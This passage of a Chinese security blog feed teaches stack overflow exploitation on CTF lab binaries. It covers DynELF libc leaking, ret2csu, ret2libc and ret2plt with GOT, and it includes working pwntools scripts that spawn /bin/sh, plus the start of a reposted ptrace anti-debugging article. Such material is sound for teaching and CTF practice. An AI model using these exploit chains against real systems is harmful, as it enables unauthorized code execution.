class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./rop_sample"</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">vulfunc_addr = <span class="number">0x0804844b</span> <span class="comment"># no PIE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> %(address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./rop_sample"</span>)</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./rop_sample'</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a024</span></span><br><span class="line">pppr = <span class="number">0x0804850d</span> <span class="comment"># no PIE</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0</span>)</span><br><span class="line">paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>首先来分析一下leak函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> %(address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>使用<strong>DynELF</strong>的关键是找到一个<strong>vulfunc</strong>函数去构建<strong>leak</strong>函数，其中vulfunc函数的特征是具有可无限次读写内存地址的能力，比如例子中的<strong>vul_func</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);<span class="comment">//STDIN_FILENO = 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们执行<strong>vul_func</strong>的时候，可以向<strong>bss</strong>段写入一段数据，且存在栈溢出，我们就可以控制它在<strong>read</strong>函数和write函数之间来回执行，实现无限读写，事实上我们的<strong>payload</strong>也是这样构建的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>首先<code>&quot;A&quot;*132</code>是因为<strong>buf</strong>开的栈大小是128个字节，那么只需要再加4个字节覆盖掉<strong>Caller’s EBP</strong>，就可以让我们想要跳转的地址覆盖掉 <strong>Ret Addr</strong>，这里我们是<strong>write</strong>函数，然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(vulfunc_addr) + p32(1) + p32(address) + p32(4)</span><br></pre></td></tr></table></figure><p>构成了<strong>write</strong>函数新的栈帧，其中<code>p32(vulfunc_addr)</code>成为了<strong>write</strong>函数的<strong>Ret Addr</strong>，将重新跳回到<strong>vul_func</strong>重复读写，然后<code>p32(1)</code>就是write函数的第一个参数<strong>STDOUT_FILENO</strong>，然后<code>p32(address)</code>就是我们希望暴露的地址，最后一个<code>p32(4)</code>是我们<strong>write</strong>函数读取的字节数，因为我们就读取了一个<code>p32(address)</code>就是32位系统下的指针，也就是4个字节</p><p>然后<code>data = p.recv(4)</code>，也是因为我们希望得到的是一个32位系统的地址指针，也就是4字节，如果是64位系统就是8个字节</p><p>然后我们完成了leak函数的构造，接下来我们只需要调用<strong>pwntools</strong>里面的工具就ok了，就可以获得我们想要的地址了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, elf=ELF(&apos;./rop_sample&apos;))</span><br><span class="line">system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)</span><br></pre></td></tr></table></figure><p>然后<strong>payload2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0</span>)</span><br><span class="line">paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)</span><br></pre></td></tr></table></figure><p>就是我们先调用<strong>read</strong>函数手动输入<strong>“bin/sh“</strong>到<strong>bss</strong>段地址，<strong>pppr</strong>就是<strong>pop*3+ret</strong>，<strong>pop*3</strong>就是为了栈平衡，因为<strong>read</strong>函数引入了三个参数，然后<strong>ret</strong>就会<strong>ret</strong>到<strong>system_addr</strong>开始调用<strong>system</strong>函数，因为第二个参数是<strong>bss_addr</strong>，之前我们已经在<strong>bss</strong>上放入了<strong>“bin/sh”</strong>，事实上就执行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(‘/bin/sh’)</span><br></pre></td></tr></table></figure><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>首先是x64最为重要的两个变化</p><ul><li>应用程序地址空间的改变</li><li>参数传参方式的改变（<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、<strong>R8</strong>、<strong>R9</strong>）+<strong>Stack</strong></li></ul><p>比如我们调用一个<strong>write</strong>函数的汇编，因为这些数据只用32位就可以，所以是<strong>edx</strong>或者<strong>esi</strong>这类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov edx,oxd //argv[2]</span><br><span class="line">mov esi,0x400644 // argv[1]</span><br><span class="line">mov edi,0x1 //argv[0]</span><br><span class="line">call 0x400430&lt;write@plt&gt;</span><br></pre></td></tr></table></figure><p>我们一般传参常用的Gadgets就是以下三个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget1 = mov rdx,r13 | mov rsi,r14 | mov edi,r15d | call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure><p>其中<code>call    qword ptr [r12+rbx*8]</code>就是我们希望调用的函数，然后<code>mov rdx,r13</code>就是第三个参数，<code>mov rsi,r14</code>是第二个参数，<code>mov edi,r15d</code>是第四个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget2 = pop rbx | pop rbp | pop r12 | pop r13 | pop r14 | pop r15 | ret</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget3 = pop rdi | ret</span><br></pre></td></tr></table></figure><p>常见模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span> <span class="comment">#gadget1 mmmc</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span> <span class="comment">#gadget2 ppppppr</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span> </span><br><span class="line"><span class="comment">#32位 fakeebp是4个字节， 64位为8个字节</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'\x90'</span> * <span class="number">0x38</span> <span class="comment">#nop</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>如果希望使用<strong>write</strong>函数暴露地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br></pre></td></tr></table></figure><p>一般接受用的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(8))</span><br></pre></td></tr></table></figure><p>这里有个<strong>Tips</strong>，一般我们要搜索<strong>libc</strong>里面的函数地址就用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.symblos[&quot;xxxx&quot;]</span><br></pre></td></tr></table></figure><p>字符串就用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.search[&quot;xxxx&quot;]</span><br></pre></td></tr></table></figure><p>在gdb里面可以用bt命令展示各函数的起始地址</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈栈溢出填充布局-1</title>
      <link href="/2019/12/22/%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95%E2%95%92%E2%95%97%E2%95%A5%CF%84%E2%94%82%C3%B7%E2%95%A0%CE%B5%E2%94%82%CE%A3%E2%96%93%E2%95%9D%E2%95%9B%E2%95%93-1/"/>
      <url>/2019/12/22/%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95%E2%95%92%E2%95%97%E2%95%A5%CF%84%E2%94%82%C3%B7%E2%95%A0%CE%B5%E2%94%82%CE%A3%E2%96%93%E2%95%9D%E2%95%9B%E2%95%93-1/</url>
      
        <content type="html"><![CDATA[<h2 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h2><p>如果判断我们再写payload的时候，该如何填充分配布局。首先上一张经典的内存图</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png" alt></p><p>我们都知道栈溢出的关键点就是覆盖修改掉<strong>EBP</strong>所指地址下面的<strong>Return Addr</strong>从而达到劫持EIP修改程序流程</p><p>举一个例子</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/2.png" alt="img"></p><p>我们打开IDA常常能看到形似这样的提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf; //[rsp+0h][rbp-80h]</span><br></pre></td></tr></table></figure><p>就这代表<strong>buf</strong>的起始地址距离rbp的长度是0x80，也就是0x80个字节，也就是0x80个char类型数据，好了，我们知道如果填充0x80个字母，就会覆盖掉ESP所指的内容，那么距离我们需要覆盖掉的<strong>Return Addr</strong>还隔着一个<strong>Main’s EBP</strong>，这是一个指针的数据类型，我们知道在32位系统里面，一个指令所占的内存是4个字节，如果是64位系统就是8个字节，所以我们还需要填充相应个数的字节，我们才能将我们的伪造的Return Addr覆盖到那个位置</p><p>如果要判断每个变量的相对地址大小也很容易，再举个例子</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/when_did_you_born/pic/2.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char v4; //[rsp+0h][rbp-20h]</span><br><span class="line">int v5;//[rsp+8h][rbp-18h]</span><br></pre></td></tr></table></figure><p>可以知道两个变量的距离就是相距0x8个字节</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3><p>继续先放一张图</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png" alt></p><p>我们一般的<strong>ROP</strong>就是覆盖掉<strong>Ret Addr</strong>使得EIP指向我们需要的内存中已经存在的指令</p><p>例如，如果我们有可以利用的<strong>libc</strong>的话，一般是直接跳转调用<strong>system</strong>函数。原本ret addr返回到caller func的call callee下一条指令处，但我们将其修改为system函数的地址，此时ret就相当于调用了system。而system调用时，我们的payload在Ret addr下面伪造了栈帧，布置其ret addr为exit函数地址，如果是rop，就是下一个gadgets的地址，然后接下来的内存地址就是函数的调用参数，攻击链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret -&gt; system(arg) -&gt; exit</span><br></pre></td></tr></table></figure><p>举一个 bamboofox 中 ret2libc1 为例  </p><p>首先，我们可以检查一下程序的安全保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2libc1 checksec ret2libc1    </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048720</span> : /bin/sh</span><br></pre></td></tr></table></figure><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">08048460</span> ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">112</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>可以到核心payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos; * 112 + system_plt +&apos;b&apos; * 4 + binsh_addr</span><br></pre></td></tr></table></figure><p>因为<strong>v4</strong>是<code>[ebp-64h]</code>，然后又是32位系统，故若想要<strong>system</strong>的地址覆盖<strong>ret addr</strong>就需要<strong>0x64+0x4</strong>个字节，然后我们不需要再跳转到其他地址，所以返回地址就随便填四个字节的数据就可以，然后第一个参数<strong>binsh</strong>的地址就跟着</p><p>如果我们想查看已有符号表的函数地址，可以在<strong>gdb</strong>里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p system</span><br></pre></td></tr></table></figure><h3 id="Ret2plt"><a href="#Ret2plt" class="headerlink" title="Ret2plt"></a>Ret2plt</h3><p><strong>ALSR</strong>的出现导致<strong>libc.so</strong>基址随机化，而<strong>plt</strong>缺因为<strong>ELF</strong>本身没有随机化(前<strong>PIE</strong>时代)而不会发生变化，所以我们可以不直接ret2libc，而是间接ret2plt</p><p><strong>PLT(Proceduce Link Table)，GOT(Global Offset Table)</strong></p><p><strong>GOT</strong>是一个存储外部库函数的表，可以用<strong>GOT</strong>表来间接引用全局变量、函数，也可以把<strong>GOT</strong>表的首地址作为一个基准，用相对于该基准的偏移量来引用静态变量、静态函数。意思是说，<strong>GOT</strong>是一个映射表，这里的内容是此段代码里面引用到的外部符号的地址映射，比如你用到了一个<code>printf</code>函数，就会和<strong>GOT</strong>表产生关系。那这又和<strong>PLT</strong>有什么关系呢</p><p>PLT表可以称为内部函数表，GOT表为全局函数表，这两个表是相对应的，为什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，是一一对应的。所以PLT表中存储的数字到底是什么意思？</p><p><strong>其实就是以GOT表的首地址作为一个基准称为基值，PLT中的值即为所指向函数在内存中相对于基值的偏移量（offset）</strong></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(128).png" alt></p><p>也就是说<code>printf@plt</code>的在内存中的真实地址是： <strong>GOT基值+PLT存储的偏移量</strong></p><ul><li><code>got[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>GOT</strong></li><li><code>plt[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>PLT</strong></li></ul><p>一般来说GOT表是可以改变的，是可写的，PLT表一般是不变的</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-bcf9343191848103.png" alt="img"></p><p>当我们第一次<strong>call puts</strong>函数，首先跳转到<strong>PLT</strong>表中的<strong>puts</strong>项(<strong>0x080482b0</strong>)，然后又会<strong>jmp</strong>到<strong>GOT</strong>表中的一个地址(<strong>0x80496f8</strong>)，然后这个地址中存储的数据刚好就是<strong>jmp</strong>指令的下一个<strong>push</strong>指令(<strong>0x080482b6</strong>)，实际上<strong>push</strong>的是<strong>PLT</strong>表中<strong>puts</strong>函数的编号，实际上就是模拟了一个<strong>call</strong>，然后又会跳转到一个全局函数(<strong>0x80482a0</strong>)，去<strong>GOT</strong>表中找到真正的<strong>puts</strong>地址(<strong>0xf7e7c7e0</strong>)，同时会修改<strong>PLT</strong>表中<strong>jmp</strong>的第一个地址(<strong>9x80496f8</strong>)的内容为真正的<strong>puts</strong>地址(<strong>0xf7e7c7e0</strong>)</p><p>当程序第二次<strong>call puts</strong>时从<strong>PLT</strong>表里<strong>jmp</strong>的就是真正的<strong>puts</strong>函数地址了</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-9baedd55881a39dd.png" alt="img"></p><p>Ret2plt较之ret2libc更为局限，因为只有漏洞程序调用的库函数才会出现在PLT表。Redhat和fedora上部署了一种ASCII armoring的保护机制。这一机制使得库函数地址都包含一个\x00字节(用来截断copy)</p><p>衍生出一种利用PPR链(POP POP Ret)和strcpy@plt拼凑出system地址的新ret2plt方法，并覆写某个其他plt函数的got项<img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%B5%85%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A1%AB%E5%85%85%E5%B8%83%E5%B1%80-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(129).png" alt></p><p>相当于第一次<strong>copy system</strong>函数<strong>PLT</strong>的<strong>GOT</strong>项的第一个字节到<strong>puts</strong>函数<strong>PLT</strong>的<strong>GOT</strong>项的第一个字节，然后<strong>PPR</strong>的链作为返回地址，<strong>got[0] of puts</strong> 和<strong>Addr of system[0]</strong>分别是第<strong>1</strong>和第<strong>2</strong>参数，则当<strong>PPR</strong>后，弹出栈中<strong>got[0] of puts</strong>和<strong>Addr of system[0]</strong>后，<strong>ret</strong>的地址就是<strong>Addr of system[0]</strong>下面的又一个<strong>strcpy</strong>函数，因为是32位系统，一个指针4个字节，重复4次就能修改<strong>puts</strong>为<strong>system</strong>函数</p><p>常见的read函数payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr) + p32(0) + p32(buf2_addr) + p32(0x100)</span><br></pre></td></tr></table></figure><p>返回地址是<strong>buf</strong>的话，一般就是<strong>buf</strong>上面布置了<strong>ROP</strong>链或者<strong>shellcode</strong></p><p>常见的write函数payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(elf.symbols[&quot;write&quot;])+p32(main) + p32(1)+p32(elf.got[&quot;write&quot;])+p32(4)</span><br></pre></td></tr></table></figure><p>就是返回地址是<strong>mian</strong>函数的地址，然后其他三个参数参考<strong>write</strong>函数的<strong>API</strong>定义</p><p>如果已知libc.so则可以先通过ELF先计算出write和system的偏移，再用输出地址减去write的偏移就可以计算出libc.so的基址，再用libc.so的基址加上system的偏移就可以动态算出system在本次运行时的地址，未知libc则需要额外的leak函数</p><p>一般暴露的都是函数在GOT表中的地址</p><p>得到write函数与system函数偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_set = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]</span><br></pre></td></tr></table></figure><p>然后当我们拿到<code>write</code>函数在<strong>GOT</strong>表中的真实地址时,就可以计算出基值的真实地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - off_set</span><br></pre></td></tr></table></figure><p>合并在一起就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - （libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>转载-Linux逆向之调试&amp;反调试</title>
      <link href="/2019/12/21/%E2%95%AB%C2%AC%E2%95%98%E2%95%AA-Linux%E2%94%80%C2%B5%E2%95%A7%E2%89%A5%E2%95%93%C2%AB%E2%95%A1%E2%89%88%E2%95%A9%E2%95%98/"/>
      <url>/2019/12/21/%E2%95%AB%C2%AC%E2%95%98%E2%95%AA-Linux%E2%94%80%C2%B5%E2%95%A7%E2%89%A5%E2%95%93%C2%AB%E2%95%A1%E2%89%88%E2%95%A9%E2%95%98/</url>
      
        <content type="html"><![CDATA[<p>转载自：<a href="https://xz.aliyun.com/t/6882" target="_blank" rel="noopener">https://xz.aliyun.com/t/6882</a></p><h2 id="调试器的实现原理"><a href="#调试器的实现原理" class="headerlink" title="调试器的实现原理"></a>调试器的实现原理</h2><p>要想进行调试，调试器是必不可少的，首先需要了解一下我们常用的Linux下的调试器如GDB，是如何实现的</p><p>GDB 基于ptrace编写而成的调试器，ptrace是一个Linux提供的用于调试的系统调用</p><p>函数原型如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NAME </span><br><span class="line">    ptrace - process trace</span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ptrace.h&gt;</span><br><span class="line">       long ptrace(enum __ptrace_request request, pid_t pid,</span><br><span class="line">                   void *addr, void *data);</span><br></pre></td></tr></table></figure><p>简单来说， <strong>ptrace系统调用提供了一种方法来让父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。 主要用来实现断点调试和系统调用跟踪</strong></p><p>这个函数根据 request 参数来表示想要请求执行的行为 ，并且根据不同的request决定后续的pid、addr、data参数是否有意义。</p><p>下面是几个常见的 request 参数的可选项：</p><ul><li><p>PTRACE_TRACEME 